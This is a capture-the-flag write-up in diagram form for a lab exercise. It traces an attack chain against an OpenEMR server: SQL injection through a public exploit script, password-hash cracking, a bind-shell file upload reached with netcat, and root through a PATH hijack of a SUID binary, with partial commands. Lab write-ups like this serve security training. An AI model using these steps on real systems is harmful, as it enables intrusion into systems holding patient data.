# Attack Path Diagram
## CIP-A105 | CTF2 | Operation Black Forge

---

+----------------------------------------------------------+
| KALI LINUX — 192.168.254.129 (Attacker) |
+----------------------------------------------------------+
|
| PHASE 1 — Network Discovery
| nmap -sV -p- 192.168.254.128
|
v
+----------------------------------------------------------+
| OPFOR-02 — 192.168.254.128 |
| PORT 21: ProFTPD 1.3.3d | PORT 80: Apache 2.2.17 |
+----------------------------------------------------------+
|
| PHASE 2 — Web Enumeration
| gobuster (large wordlist) -> /openemr/ found
| login.php source -> validateUser.php?u= identified
|
v
+----------------------------------------------------------+
| OpenEMR 4.1.0 at /openemr/ |
| validateUser.php?u= — pre-auth AJAX endpoint |
+----------------------------------------------------------+
|
| PHASE 3/4 — Exploit Chain
| python3 49742.py
| Time-based blind SQL injection (unauthenticated)
|
v
+----------------------------------------------------------+
| DATABASE CREDENTIAL EXTRACTION |
| admin : 3863efef... (SHA1) |
| medical : ab24aed5... (SHA1) |
+----------------------------------------------------------+
|
| john/hashcat + rockyou.txt
| Cracked in < 1 second
|
v
+----------------------------------------------------------+
| PLAINTEXT CREDENTIALS |
| admin : ackbar |
| medical : medical |
+----------------------------------------------------------+
|
| curl POST authPass=SHA1hash -> HTTP 200 OK
| Authenticated as admin
|
v
+----------------------------------------------------------+
| AUTHENTICATED OpenEMR SESSION (admin) |
| manage_site_files.php — arbitrary file upload |
+----------------------------------------------------------+
|
| Upload bindshell2.php -> /sites/default/images/
| curl trigger -> PHP opens TCP port 5555
| nc 192.168.254.128 5555 -> shell obtained
|
v
+----------------------------------------------------------+
| PHASE 5 — SHELL AS APACHE |
| uid=479(apache) gid=416(apache) |
| Shorewall blocks outbound TCP (reverse shell failed) |
| Bind shell bypasses restriction |
+----------------------------------------------------------+
|
| Post-exploitation enumeration
| find / -perm -4000 -> /usr/bin/healthcheck
| strings /usr/bin/healthcheck
| -> system() calls without absolute paths
|
v
+----------------------------------------------------------+
| PHASE 6 — PRIVILEGE ESCALATION |
| PATH HIJACK via /usr/bin/healthcheck (SUID root) |
| |
| echo 'cp /bin/bash /tmp/rootbash && chmod 4777 ...' |
| > /tmp/ifconfig |
| export PATH=/tmp:$PATH ; /usr/bin/healthcheck |
| |
| healthcheck calls ifconfig -> resolves to /tmp/ifconfig|
| Executes as root -> rootbash created |
+----------------------------------------------------------+
|
| /tmp/rootbash -p -c 'id'
| euid=0(root) CONFIRMED
|
v
+----------------------------------------------------------+
| ROOT ACCESS ACHIEVED |
| |
| user flag: d41d8cd98f00b204e9800998ecf8427e |
| (/home/almirant/user.txt) |
| |
| root flag: eaff25eaa9ffc8b62e3dfebf70e83a7b |
| (/root/root.txt) |
+----------------------------------------------------------+


---

## Phase Timeline

| Phase | Key Action | Result |
|-------|-----------|--------|
| 1 | nmap full TCP scan | 2 open ports: 21 (FTP), 80 (HTTP) |
| 2 | gobuster large wordlist + login.php analysis | /openemr/ discovered, validateUser.php?u= identified |
| 3 | searchsploit cross-reference | 49742.py selected as primary vector |
| 4a | python3 49742.py | admin and medical hashes extracted |
| 4b | john/hashcat | ackbar and medical cracked in < 1 second |
| 4c | curl pre-hashed authPass | Authenticated session as admin |
| 4d | manage_site_files.php upload | bindshell2.php in web-accessible directory |
| 4e | nc 192.168.254.128 5555 | Interactive shell as apache uid=479 |
| 5 | SUID enumeration, strings analysis | healthcheck PATH hijack identified |
| 6 | PATH hijack execution | rootbash created, euid=0 confirmed |
| 6 | rootbash -p -c 'cat flags' | Both mission flags retrieved |
